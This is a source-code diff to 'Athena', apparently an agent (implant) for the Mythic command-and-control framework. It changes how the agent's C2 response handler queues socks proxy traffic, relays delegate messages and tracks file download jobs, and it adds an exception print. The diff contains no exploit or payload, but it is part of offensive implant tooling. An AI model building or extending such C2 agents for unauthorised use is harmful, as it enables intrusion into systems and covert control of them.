@@ -279,12 +279,12 @@ namespace Athena
                         break;
                 };
             }
-
+            List<SocksMessage> lm = Globals.bagOut.Reverse().ToList();
             PostResponseResponse prr = new PostResponseResponse()
             {
                 action = "post_response",
                 responses = lrr,
-                socks = Globals.bagOut.Values.ToList() ?? new List<SocksMessage>(),
+                socks = lm ?? new List<SocksMessage>(),
                 delegates = Globals.delegateMessages ?? new List<DelegateMessage>()
             };
 
@@ -363,40 +363,42 @@ namespace Athena
                 }
                 else
                 {
-                    PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-
                     if (string.IsNullOrEmpty(responseString))
                     {
+                        //We failed to get a response from the server
                         return false;
                     }
-                    else
+
+                    PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
+
+                    //Check for socks messages to pass on
+                    if(cs.socks != null)
                     {
-                        //Check for delegates to pass on
-                        if (cs.delegates != null && cs.delegates.Count > 0)
+                        foreach (var s in cs.socks)
                         {
-                            foreach (var del in cs.delegates)
-                            {
-                                Globals.outMessages.Add(del);
-                            }
+                            Globals.bagIn.Add(s);
                         }
-                        //Check for socks messages to pass on
-                        if (cs.socks != null && cs.socks.Count > 0)
+                    }
+
+                    //Check for delegates to pass on
+                    if (cs.delegates != null)
+                    {
+                        foreach (var del in cs.delegates)
                         {
-                            foreach (var s in cs.socks)
-                            {
-                                Globals.bagIn.Add(s);
-                            }
+                            Globals.outMessages.Add(del);
                         }
-                        foreach (var response in cs.responses)
+                    }
+
+                    //Check for socks messages to pass on
+                    foreach (var response in cs.responses)
+                    {
+                        if (!String.IsNullOrEmpty(response.file_id))
                         {
-                            if (!String.IsNullOrEmpty(response.file_id))
+                            MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                            if (string.IsNullOrEmpty(j.file_id))
                             {
-                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
-                                if (string.IsNullOrEmpty(j.file_id))
-                                {
-                                    j.file_id = response.file_id;
-                                    j.hasoutput = false;
-                                }
+                                j.file_id = response.file_id;
+                                j.hasoutput = false;
                             }
                         }
                     }
@@ -404,6 +406,7 @@ namespace Athena
             }
             catch (Exception e)
             {
+                Console.WriteLine(e.Message);
                 return false;
             }
             return true;
